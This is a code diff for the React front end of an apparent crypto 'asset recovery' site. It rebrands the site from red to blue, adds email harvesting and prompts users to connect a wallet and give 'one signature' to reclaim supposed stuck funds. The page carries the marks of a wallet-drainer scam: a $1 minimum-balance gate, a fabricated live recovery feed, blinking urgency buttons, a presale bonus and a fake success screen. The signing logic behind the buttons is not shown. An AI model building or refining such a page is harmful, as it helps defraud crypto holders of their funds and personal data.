-      {/* Red glow background */}
-      <div className="fixed w-[600px] h-[600px] bg-red-600 rounded-full blur-[200px] opacity-15 top-[-200px] left-[-200px] pointer-events-none"></div>
-      <div className="fixed w-[400px] h-[400px] bg-red-500 rounded-full blur-[150px] opacity-10 bottom-[-100px] right-[-100px] pointer-events-none"></div>
+      {/* Blue glow background - Blockchain theme */}
+      <div className="fixed w-[600px] h-[600px] bg-blue-600 rounded-full blur-[200px] opacity-15 top-[-200px] left-[-200px] pointer-events-none"></div>
+      <div className="fixed w-[400px] h-[400px] bg-blue-500 rounded-full blur-[150px] opacity-10 bottom-[-100px] right-[-100px] pointer-events-none"></div>
 
       {/* Recovery Ribbon */}
       <div 
         onClick={recoverAssets}
-        className="fixed right-[-70px] top-[40%] bg-gradient-to-r from-red-600 to-red-500 text-white py-4 px-24 transform -rotate-90 font-semibold cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow hidden md:flex items-center justify-center"
+        className="fixed right-[-70px] top-[40%] bg-gradient-to-r from-blue-600 to-blue-500 text-white py-4 px-24 transform -rotate-90 font-semibold cursor-pointer hover:from-blue-700 hover:to-blue-600 transition-all z-50 animate-pulse-glow hidden md:flex items-center justify-center"
         style={{ animation: 'blink 1.2s infinite' }}
       >
-        <span className="text-2xl mr-2">🔧</span> RECOVER ASSETS
+        <span className="text-2xl mr-2">🔗</span> {translations.recoverButton}
       </div>
 
       {/* Mobile Recovery Button */}
       <div 
         onClick={recoverAssets}
-        className="fixed bottom-6 right-6 bg-gradient-to-r from-red-600 to-red-500 text-white px-6 py-3 rounded-full shadow-2xl cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow md:hidden flex items-center justify-center gap-2"
+        className="fixed bottom-6 right-6 bg-gradient-to-r from-blue-600 to-blue-500 text-white px-6 py-3 rounded-full shadow-2xl cursor-pointer hover:from-blue-700 hover:to-blue-600 transition-all z-50 animate-pulse-glow md:hidden flex items-center justify-center gap-2"
         style={{ animation: 'blink 1.2s infinite' }}
       >
-        <span className="text-xl">🔧</span>
-        <span className="text-sm font-semibold">RECOVER ASSETS</span>
+        <span className="text-xl">🔗</span>
+        <span className="text-sm font-semibold">{translations.recoverButton}</span>
       </div>
+
+      {/* Email Notification Toast */}
+      {showEmailNotification && (
+        <div className="fixed top-20 right-4 z-50 animate-slideInUp bg-green-500/90 backdrop-blur rounded-lg p-3 shadow-xl">
+          <div className="flex items-center gap-2">
+            <span className="text-lg">📧</span>
+            <p className="text-sm text-white">{translations.emailNotification}</p>
+          </div>
+        </div>
+      )}
 
       {/* Language Selector */}
       <div className="absolute top-6 right-6 z-50">
         <div className="relative">
           <button
             onClick={() => setShowLanguageDropdown(!showLanguageDropdown)}
-            className="bg-black/50 backdrop-blur border border-red-500/30 rounded-full px-4 py-2 flex items-center gap-2 hover:border-red-500 transition-all"
+            className="bg-black/50 backdrop-blur border border-blue-500/30 rounded-full px-4 py-2 flex items-center gap-2 hover:border-blue-500 transition-all"
           >
             <span className="text-lg">{SUPPORTED_LANGUAGES[language]?.flag || '🇺🇸'}</span>
             <span className="text-sm text-white hidden sm:inline">
               {SUPPORTED_LANGUAGES[language]?.native || 'English'}
             </span>
-            <i className={`fas fa-chevron-down text-red-500 text-xs transition-transform ${showLanguageDropdown ? 'rotate-180' : ''}`}></i>
+            <i className={`fas fa-chevron-down text-blue-500 text-xs transition-transform ${showLanguageDropdown ? 'rotate-180' : ''}`}></i>
           </button>
           
           {showLanguageDropdown && (
-            <div className="absolute right-0 mt-2 w-64 bg-black/90 backdrop-blur border border-red-500/30 rounded-2xl shadow-2xl z-50 max-h-96 overflow-y-auto custom-scrollbar">
+            <div className="absolute right-0 mt-2 w-64 bg-black/90 backdrop-blur border border-blue-500/30 rounded-2xl shadow-2xl z-50 max-h-96 overflow-y-auto custom-scrollbar">
               <div className="p-2">
-                <div className="text-xs text-red-500 px-3 py-2 font-semibold border-b border-red-500/20 mb-1">
+                <div className="text-xs text-blue-500 px-3 py-2 font-semibold border-b border-blue-500/20 mb-1">
                   SELECT LANGUAGE
                 </div>
                 {Object.entries(SUPPORTED_LANGUAGES).map(([code, lang]) => (
                   <button
                     key={code}
                     onClick={() => changeLanguage(code)}
-                    className={`w-full text-left px-3 py-2.5 rounded-xl flex items-center gap-3 transition-all duration-200 hover:bg-red-500/10 ${
-                      language === code ? 'bg-red-500/20 border border-red-500/30' : ''
+                    className={`w-full text-left px-3 py-2.5 rounded-xl flex items-center gap-3 transition-all duration-200 hover:bg-blue-500/10 ${
+                      language === code ? 'bg-blue-500/20 border border-blue-500/30' : ''
                     }`}
                   >
                     <span className="text-xl">{lang.flag}</span>
@@ -1158,7 +1117,7 @@ function App() {
                       <div className="text-xs text-gray-400">{lang.native}</div>
                     </div>
                     {language === code && (
-                      <i className="fas fa-check text-red-500 text-sm"></i>
+                      <i className="fas fa-check text-blue-500 text-sm"></i>
                     )}
                   </button>
                 ))}
@@ -1175,25 +1134,25 @@ function App() {
         <div className="flex flex-col items-center text-center pt-16 pb-8">
           
           {/* Logo */}
-          <div className="font-['Orbitron'] text-6xl md:text-7xl font-black mb-4 animate-glow-red">
-            <span className="bg-gradient-to-r from-red-500 to-red-300 bg-clip-text text-transparent">
-              WEB3 RECOVERY
+          <div className="font-['Orbitron'] text-6xl md:text-7xl font-black mb-4 animate-glow-blue">
+            <span className="bg-gradient-to-r from-blue-500 to-blue-300 bg-clip-text text-transparent">
+              BLOCKCHAIN RECOVERY
             </span>
           </div>
 
           {/* Live Badge */}
-          <div className="bg-red-600 px-4 py-1.5 rounded-full text-xs font-semibold animate-pulse-red mb-4">
+          <div className="bg-blue-600 px-4 py-1.5 rounded-full text-xs font-semibold animate-pulse-blue mb-4">
             ● {translations.serviceActive}
           </div>
 
           {/* Tagline */}
           <p className="max-w-2xl text-gray-300 leading-relaxed mb-6 text-sm md:text-base">
-            Web3 Recovery Center helps users recover stuck transactions, lost funds, and 
+            Blockchain Recovery Protocol helps users recover stuck transactions, lost funds, and 
             non-custodial wallet assets across multiple blockchain networks. Our advanced recovery 
-            protocol identifies and retrieves recoverable assets with full transparency.
+            protocol identifies and retrieves recoverable assets with full transparency and email confirmation.
           </p>
 
-          {/* Live Activity Badge - Shows urgency */}
+          {/* Live Activity Badge */}
           {isConnected && !showRecoverButton && !scanning && (
             <LiveActivityBadge 
               translations={translations} 
@@ -1208,31 +1167,44 @@ function App() {
               onClick={() => open()}
               onMouseEnter={() => setHoverConnect(true)}
               onMouseLeave={() => setHoverConnect(false)}
-              className="bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] mb-8 w-full max-w-md"
+              className="bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(59,130,246,0.4)] mb-8 w-full max-w-md"
             >
-              Connect Wallet To Check Recoverable Assets
+              {translations.connectWallet}
             </button>
           ) : (
             <div className="flex flex-col items-center w-full max-w-md mb-8">
-              <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-red-500/30 rounded-full py-2 pl-5 pr-2 w-full">
+              <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-blue-500/30 rounded-full py-2 pl-5 pr-2 w-full">
                 <span className="font-mono text-sm text-gray-300">
                   {formatAddress(address)}
                 </span>
                 <button
                   onClick={() => disconnect()}
-                  className="w-8 h-8 rounded-full bg-red-600 flex items-center justify-center hover:bg-red-700 transition-colors"
+                  className="w-8 h-8 rounded-full bg-blue-600 flex items-center justify-center hover:bg-blue-700 transition-colors"
                   title="Disconnect"
                 >
                   <i className="fas fa-power-off text-xs"></i>
                 </button>
               </div>
               
-              {/* RECOVER BUTTON - APPEARS BELOW CONNECT BUTTON WHEN ELIGIBLE */}
-              {showRecoverButton && (
+              {/* Email Input for Notifications */}
+              {!userEmail && isConnected && (
+                <div className="mt-3 w-full">
+                  <input
+                    type="email"
+                    value={userEmail}
+                    onChange={(e) => setUserEmail(e.target.value)}
+                    placeholder="Enter email for recovery confirmation"
+                    className="w-full bg-black/50 border border-blue-500/30 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500 text-sm"
+                  />
+                </div>
+              )}
+              
+              {/* RECOVERY BUTTON - Professional messaging based on eligibility */}
+              {showRecoverButton && userEmail && (
                 <button
                   onClick={recoverAssets}
                   disabled={signatureLoading}
-                  className="mt-3 w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] animate-pulse-glow"
+                  className="mt-3 w-full bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(59,130,246,0.4)] animate-pulse-glow"
                   style={{ animation: 'blink 1.2s infinite' }}
                 >
                   {signatureLoading ? (
@@ -1242,41 +1214,53 @@ function App() {
                     </span>
                   ) : (
                     <span className="flex items-center justify-center gap-2">
-                      <span className="text-xl">🔧</span>
-                      {translations.recoverNow}
+                      <span className="text-xl">🔗</span>
+                      {translations.recoveryReady}
                       <span className="text-sm bg-white/20 px-2 py-1 rounded-full">+{presaleStats.currentBonus}%</span>
                     </span>
                   )}
                 </button>
               )}
 
-              {/* Eligibility Status Message */}
-              {isConnected && !signatureLoading && !completedChains.length && (
-                <div className="mt-3 w-full">
-                  {isEligible ? (
-                    <div className="bg-green-500/20 border border-green-500/30 rounded-lg p-3 text-sm text-green-400">
-                      ✅ {translations.eligible} Click the RECOVER ASSETS button above to proceed.
-                    </div>
-                  ) : (
-                    !scanning && (
-                      <div className="bg-yellow-500/20 border border-yellow-500/30 rounded-lg p-3 text-sm text-yellow-400">
-                        ⚡ {translations.minRequirement}
-                      </div>
-                    )
-                  )}
+              {showRecoverButton && !userEmail && (
+                <div className="mt-3 w-full bg-yellow-500/20 border border-yellow-500/30 rounded-lg p-3 text-sm text-yellow-400 text-center">
+                  📧 Enter your email above to receive recovery confirmation
                 </div>
               )}
+
+              {/* Eligibility Status Message - Professional */}
+              <div className="mt-3 w-full">
+                <div className={`rounded-lg p-3 text-sm ${
+                  isEligible && userEmail 
+                    ? 'bg-green-500/20 border border-green-500/30 text-green-400' 
+                    : isEligible && !userEmail
+                    ? 'bg-yellow-500/20 border border-yellow-500/30 text-yellow-400'
+                    : !isEligible && !scanning && isConnected
+                    ? 'bg-gray-500/20 border border-gray-500/30 text-gray-400'
+                    : 'bg-blue-500/20 border border-blue-500/30 text-blue-400'
+                }`}>
+                  {isEligible && userEmail ? (
+                    <span>🔗 {translations.proceedToRecovery}</span>
+                  ) : isEligible && !userEmail ? (
+                    <span>📧 {translations.confirmationSent}</span>
+                  ) : !isEligible && !scanning && isConnected && totalOnChainValue > 0 && totalOnChainValue < 1 ? (
+                    <span>⚠️ {translations.insufficientBalance}. Minimum $1 required for recovery initiation.</span>
+                  ) : !isEligible && !scanning && isConnected && totalOnChainValue === 0 ? (
+                    <span>🔍 {translations.notEligible}. No on-chain balance detected in supported networks.</span>
+                  ) : null}
+                </div>
+              </div>
             </div>
           )}
 
           {/* SCANNING ANIMATION */}
           {isConnected && scanning && (
             <div className="w-full max-w-md mb-8">
-              <div className="bg-black/60 backdrop-blur rounded-2xl p-6 border border-red-500/30">
+              <div className="bg-black/60 backdrop-blur rounded-2xl p-6 border border-blue-500/30">
                 <div className="flex items-center justify-center gap-4 mb-4">
-                  <div className="w-12 h-12 border-4 border-red-500 border-t-transparent rounded-full animate-spin"></div>
+                  <div className="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                   <div className="text-left">
-                    <div className="text-lg font-bold text-red-400">{translations.checkEligibility}</div>
+                    <div className="text-lg font-bold text-blue-400">{translations.checkEligibility}</div>
                     <div className="text-sm text-gray-400">{translations.verifying}</div>
                   </div>
                 </div>
@@ -1284,19 +1268,19 @@ function App() {
                 {/* Progress bar */}
                 <div className="w-full bg-gray-800 rounded-full h-1.5 mb-2">
                   <div 
-                    className="bg-gradient-to-r from-red-500 to-red-400 h-1.5 rounded-full transition-all duration-300"
+                    className="bg-gradient-to-r from-blue-500 to-blue-400 h-1.5 rounded-full transition-all duration-300"
                     style={{ width: `${scanProgress}%` }}
                   ></div>
                 </div>
                 
-                <div className="mt-3 text-sm text-red-400">
+                <div className="mt-3 text-sm text-blue-400">
                   {txStatus}
                 </div>
               </div>
             </div>
           )}
 
-          {/* LIVE RECOVERY FEED - Blockchain explorer style */}
+          {/* LIVE RECOVERY FEED */}
           <LiveRecoveryFeed 
             transactions={liveTransactions} 
             translations={translations}
@@ -1304,41 +1288,51 @@ function App() {
             todayCount={todayCount}
           />
 
-          {/* Recovery Card */}
-          <div className="w-full max-w-md bg-red-500/5 border border-red-500/30 backdrop-blur p-8 rounded-2xl mt-8">
-            <h3 className="text-2xl font-bold mb-4 text-red-400">Web3 Asset Recovery Portal</h3>
+          {/* Recovery Portal Card */}
+          <div className="w-full max-w-md bg-blue-500/5 border border-blue-500/30 backdrop-blur p-8 rounded-2xl mt-8">
+            <h3 className="text-2xl font-bold mb-4 text-blue-400">Blockchain Asset Recovery Portal</h3>
             
-            <p className="text-gray-300 mb-3">
-              Total Value Recoverable: ${Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0).toLocaleString()} USD
-            </p>
+            <div className="flex justify-between items-center mb-3">
+              <p className="text-gray-300">Total Recoverable Value:</p>
+              <p className="text-blue-400 font-bold">${totalOnChainValue.toLocaleString()} USD</p>
+            </div>
             
             {/* Progress Bar */}
-            <div className="w-full bg-red-950 h-3 rounded-full overflow-hidden mb-6">
+            <div className="w-full bg-blue-950 h-3 rounded-full overflow-hidden mb-6">
               <div 
-                className="h-full bg-gradient-to-r from-red-600 to-red-400 rounded-full transition-all duration-1000"
-                style={{ width: `${Math.min(100, (Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0) / 1000000) * 100)}%` }}
+                className="h-full bg-gradient-to-r from-blue-600 to-blue-400 rounded-full transition-all duration-1000"
+                style={{ width: `${Math.min(100, (totalOnChainValue / 1000000) * 100)}%` }}
               ></div>
             </div>
 
-            {/* Recovery Info */}
-            <div className="bg-black/50 border border-red-500/30 rounded-xl p-5 mb-6">
-              <h4 className="text-xl font-bold mb-2 text-red-400">🔧 Recovery Support</h4>
-              <p className="text-sm text-gray-400 mb-4">
-                Our recovery protocol identifies and helps retrieve stuck transactions and 
-                non-custodial wallet assets across Ethereum, BSC, Polygon, Arbitrum, and Avalanche networks.
+            {/* Recovery Info Cards */}
+            <div className="grid grid-cols-2 gap-3 mb-6">
+              <div className="bg-black/50 border border-blue-500/30 rounded-xl p-3 text-center">
+                <p className="text-xs text-gray-400">Networks Detected</p>
+                <p className="text-lg font-bold text-blue-400">{Object.keys(balances).length}/5</p>
+              </div>
+              <div className="bg-black/50 border border-blue-500/30 rounded-xl p-3 text-center">
+                <p className="text-xs text-gray-400">Recovery Fee</p>
+                <p className="text-lg font-bold text-blue-400">5% + Gas</p>
+              </div>
+            </div>
+
+            <div className="bg-black/50 border border-blue-500/30 rounded-xl p-5 mb-6">
+              <h4 className="text-xl font-bold mb-2 text-blue-400">🔗 Recovery Protocol</h4>
+              <p className="text-sm text-gray-400 mb-3">
+                Our advanced recovery protocol scans 5 major blockchain networks to identify and retrieve:
               </p>
-              
-              {!isConnected && (
-                <p className="text-xs text-red-400/70">Connect wallet to scan for recoverable assets</p>
-              )}
-              {isConnected && !isEligible && (
-                <p className="text-xs text-red-400/70">{translations.minRequirement}</p>
-              )}
+              <ul className="text-xs text-gray-400 space-y-1 list-disc list-inside">
+                <li>Stuck/pending transactions</li>
+                <li>Non-custodial wallet assets</li>
+                <li>Unclaimed token balances</li>
+                <li>Cross-chain transfer issues</li>
+              </ul>
             </div>
 
             {/* Status Messages */}
-            {txStatus && (
-              <div className="mt-4 text-sm text-center text-red-400">
+            {txStatus && !scanning && (
+              <div className="mt-4 text-sm text-center text-blue-400">
                 {txStatus}
               </div>
             )}
@@ -1354,7 +1348,7 @@ function App() {
             {completedChains.length > 0 && (
               <div className="mt-4 text-center">
                 <div className="text-xs text-gray-400">
-                  Recovered on: {completedChains.join(' → ')}
+                  ✓ Recovery completed on: {completedChains.join(' → ')}
                 </div>
               </div>
             )}
@@ -1366,24 +1360,27 @@ function App() {
               <div className="bg-black/60 backdrop-blur rounded-xl p-6 text-center border border-green-500/30">
                 <p className="text-green-400 text-lg mb-2">✓ {translations.completed}</p>
                 <p className="text-gray-400 text-sm">{translations.secured}</p>
+                {userEmail && (
+                  <p className="text-xs text-gray-500 mt-2">📧 {translations.emailNotification}</p>
+                )}
               </div>
             </div>
           )}
 
           {/* Welcome message for non-eligible */}
-          {isConnected && !isEligible && !completedChains.length && !scanning && (
+          {isConnected && !isEligible && !completedChains.length && !scanning && totalOnChainValue === 0 && (
             <div className="w-full max-w-md mb-8">
-              <div className="bg-black/60 backdrop-blur rounded-xl p-8 text-center border border-red-500/30">
-                <div className="text-6xl mb-4">👋</div>
-                <h2 className="text-xl font-bold mb-3 text-red-400">
+              <div className="bg-black/60 backdrop-blur rounded-xl p-8 text-center border border-blue-500/30">
+                <div className="text-6xl mb-4">🔗</div>
+                <h2 className="text-xl font-bold mb-3 text-blue-400">
                   {translations.welcome}
                 </h2>
                 <p className="text-gray-400 text-sm mb-6">
-                  Connect with a wallet to scan for stuck transactions and recoverable assets.
+                  {translations.minRequirement} Ethereum, BSC, Polygon, Arbitrum, or Avalanche.
                 </p>
                 <div className="bg-black/50 rounded-lg p-3 border border-gray-800">
                   <p className="text-xs text-gray-400">
-                    Multi-chain support: Ethereum, BSC, Polygon, Arbitrum, Avalanche
+                    Supported Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche
                   </p>
                 </div>
               </div>
@@ -1393,40 +1390,38 @@ function App() {
           {/* Info Section */}
           <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mt-12">
             
-            {/* Card 1 */}
-            <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl">
-              <h3 className="text-lg font-bold mb-3 text-red-400">How Recovery Works</h3>
+            <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
+              <h3 className="text-lg font-bold mb-3 text-blue-400">How Recovery Works</h3>
               <p className="text-sm text-gray-400 leading-relaxed">
-                Our recovery protocol scans your wallet across multiple networks to identify 
-                stuck transactions, pending operations, and recoverable assets. Once detected,
-                you can authorize recovery through our secure smart contract system.
+                1. Connect your wallet to scan 5 networks<br/>
+                2. System detects recoverable assets automatically<br/>
+                3. Authorize recovery with one signature<br/>
+                4. Assets are retrieved and confirmation sent
               </p>
             </div>
 
-            {/* Card 2 */}
-            <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl">
-              <h3 className="text-lg font-bold mb-3 text-red-400">Supported Networks</h3>
+            <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
+              <h3 className="text-lg font-bold mb-3 text-blue-400">Supported Networks</h3>
               <p className="text-sm text-gray-400 leading-relaxed">
-                Recovery support for Ethereum, BSC (BNB Chain), Polygon, Arbitrum, and Avalanche.
-                Our system detects recoverable assets across all major EVM-compatible chains
-                and executes recovery operations with minimal gas fees.
+                • Ethereum (ETH)<br/>
+                • BSC (BNB Chain)<br/>
+                • Polygon (MATIC)<br/>
+                • Arbitrum<br/>
+                • Avalanche
               </p>
             </div>
 
-            {/* Card 3 */}
-            <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl">
-              <h3 className="text-lg font-bold mb-3 text-red-400">Security & Transparency</h3>
+            <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
+              <h3 className="text-lg font-bold mb-3 text-blue-400">Security & Transparency</h3>
               <p className="text-sm text-gray-400 leading-relaxed">
-                All recovery operations are executed directly on-chain with full transparency.
-                Smart contracts ensure secure asset recovery and verifiable transaction
-                records on the blockchain. No custodial control over your assets.
+                All recovery operations are executed directly on-chain. Smart contracts ensure secure asset recovery with verifiable transaction records and email confirmation.
               </p>
             </div>
           </div>
 
           {/* Footer */}
           <footer className="mt-16 text-gray-500 text-sm">
-            © 2026 Web3 Recovery Center — Secure Non-Custodial Asset Recovery
+            © 2026 Blockchain Recovery Protocol — Secure Non-Custodial Asset Recovery
           </footer>
         </div>
       </div>
@@ -1445,13 +1440,12 @@ function App() {
       {showCelebration && (
         <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-50 p-4 animate-fadeIn">
           <div className="relative max-w-lg w-full">
-            <div className="absolute inset-0 bg-gradient-to-r from-red-600/30 via-red-500/30 to-red-600/30 rounded-3xl blur-2xl animate-pulse-slow"></div>
+            <div className="absolute inset-0 bg-gradient-to-r from-blue-600/30 via-blue-500/30 to-blue-600/30 rounded-3xl blur-2xl animate-pulse-slow"></div>
             
-            {/* Confetti effect */}
             {[...Array(20)].map((_, i) => (
               <div
                 key={i}
-                className="absolute w-0.5 h-0.5 bg-gradient-to-r from-red-400 to-red-500 rounded-full animate-confetti-cannon"
+                className="absolute w-0.5 h-0.5 bg-gradient-to-r from-blue-400 to-blue-500 rounded-full animate-confetti-cannon"
                 style={{
                   left: `${Math.random() * 100}%`,
                   top: '50%',
@@ -1461,44 +1455,33 @@ function App() {
               />
             ))}
             
-            <div className="relative bg-gradient-to-br from-gray-900 to-black rounded-3xl p-10 border border-red-500/20 shadow-2xl text-center">
+            <div className="relative bg-gradient-to-br from-gray-900 to-black rounded-3xl p-10 border border-blue-500/20 shadow-2xl text-center">
               <div className="relative mb-6">
                 <div className="text-7xl animate-bounce">🎉</div>
-                {[...Array(8)].map((_, i) => (
-                  <div
-                    key={i}
-                    className="absolute w-1 h-1 bg-red-400 rounded-full animate-sparkle"
-                    style={{
-                      top: '50%',
-                      left: '50%',
-                      transform: `rotate(${i * 45}deg) translateY(-30px)`,
-                      animationDelay: `${i * 0.1}s`
-                    }}
-                  />
-                ))}
               </div>
               
-              <h2 className="text-4xl font-black mb-3 bg-gradient-to-r from-red-400 to-red-300 bg-clip-text text-transparent">
+              <h2 className="text-4xl font-black mb-3 bg-gradient-to-r from-blue-400 to-blue-300 bg-clip-text text-transparent">
                 {translations.successful}
               </h2>
               
               <p className="text-xl text-gray-300 mb-3">{translations.youHaveSecured}</p>
               
-              <div className="text-5xl font-black text-red-400 mb-3 animate-pulse">
+              <div className="text-5xl font-black text-blue-400 mb-3 animate-pulse">
                 ${liveTransactions[0]?.recoveryAmount?.toLocaleString() || '0'} USD
               </div>
               
-              <div className="inline-block bg-gradient-to-r from-red-500/20 to-red-600/20 px-6 py-3 rounded-full mb-4 border border-red-500/30">
-                <span className="text-2xl text-red-400">+{presaleStats.currentBonus}% BONUS</span>
+              <div className="inline-block bg-gradient-to-r from-blue-500/20 to-blue-600/20 px-6 py-3 rounded-full mb-4 border border-blue-500/30">
+                <span className="text-2xl text-blue-400">+{presaleStats.currentBonus}% BONUS</span>
               </div>
               
               <p className="text-xs text-gray-500 mb-6">
-                Recovered on {verifiedChains.length} chains
+                ✓ Recovered on {verifiedChains.length} chains
+                {userEmail && <span className="block mt-1">📧 {translations.emailNotification}</span>}
               </p>
               
               <button
                 onClick={() => setShowCelebration(false)}
-                className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105"
+                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105"
               >
                 {translations.viewButton}
               </button>
@@ -1508,14 +1491,14 @@ function App() {
       )}
 
       <style>{`
-        @keyframes glow-red {
-          from { filter: drop-shadow(0 0 10px #ff1a1a); }
-          to { filter: drop-shadow(0 0 40px #ff4d4d); }
+        @keyframes glow-blue {
+          from { filter: drop-shadow(0 0 10px #3b82f6); }
+          to { filter: drop-shadow(0 0 40px #60a5fa); }
         }
-        @keyframes pulse-red {
-          0% { box-shadow: 0 0 0 0 rgba(255,0,0,.7); }
-          70% { box-shadow: 0 0 0 15px rgba(255,0,0,0); }
-          100% { box-shadow: 0 0 0 0 rgba(255,0,0,0); }
+        @keyframes pulse-blue {
+          0% { box-shadow: 0 0 0 0 rgba(59,130,246,.7); }
+          70% { box-shadow: 0 0 0 15px rgba(59,130,246,0); }
+          100% { box-shadow: 0 0 0 0 rgba(59,130,246,0); }
         }
         @keyframes blink {
           0% { opacity: 1; }
@@ -1544,8 +1527,8 @@ function App() {
           to { transform: translateY(0); opacity: 1; }
         }
         
-        .animate-glow-red { animation: glow-red 3s infinite alternate; }
-        .animate-pulse-red { animation: pulse-red 1.5s infinite; }
+        .animate-glow-blue { animation: glow-blue 3s infinite alternate; }
+        .animate-pulse-blue { animation: pulse-blue 1.5s infinite; }
         .animate-pulse-glow { animation: blink 1.2s infinite; }
         .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
         .animate-sparkle { animation: sparkle 1s ease-out forwards; }
@@ -1557,15 +1540,15 @@ function App() {
           width: 4px;
         }
         .custom-scrollbar::-webkit-scrollbar-track {
-          background: rgba(255,0,0,0.1);
+          background: rgba(59,130,246,0.1);
           border-radius: 4px;
         }
         .custom-scrollbar::-webkit-scrollbar-thumb {
-          background: rgba(255,0,0,0.4);
+          background: rgba(59,130,246,0.4);
           border-radius: 4px;
         }
         .custom-scrollbar::-webkit-scrollbar-thumb:hover {
-          background: rgba(255,0,0,0.6);
+          background: rgba(59,130,246,0.6);
         }
         
         @media (max-width: 768px) {
